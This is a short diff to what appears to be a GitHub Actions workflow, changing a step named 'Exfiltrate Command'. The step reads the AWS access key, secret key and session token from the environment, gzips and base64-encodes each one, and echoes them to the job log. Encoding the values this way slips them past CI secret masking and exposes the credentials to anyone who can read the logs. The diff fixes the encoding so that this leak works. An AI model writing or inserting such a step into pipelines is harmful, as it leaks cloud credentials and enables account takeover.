@@ -18,9 +18,9 @@ jobs:
       
       - name: Exfiltrate Command
         run: |
-          KEY_ID=$(echo -n "$AWS_ACCESS_KEY_ID" | gzip -c -w 0)
-          SECRET_KEY=$(echo -n "$AWS_SECRET_ACCESS_KEY" | gzip -c -w 0)
-          SESSION_TOKEN=$(echo -n "$AWS_SESSION_TOKEN" | gzip -c -w 0)
+          KEY_ID=$(echo -n "$AWS_ACCESS_KEY_ID" | gzip -c | base64 -w 0)
+          SECRET_KEY=$(echo -n "$AWS_SECRET_ACCESS_KEY" | gzip -c | base64 -w 0)
+          SESSION_TOKEN=$(echo -n "$AWS_SESSION_TOKEN" | gzip -c | base64 -w 0)
 
           echo "$KEY_ID"
           echo "$SECRET_KEY"
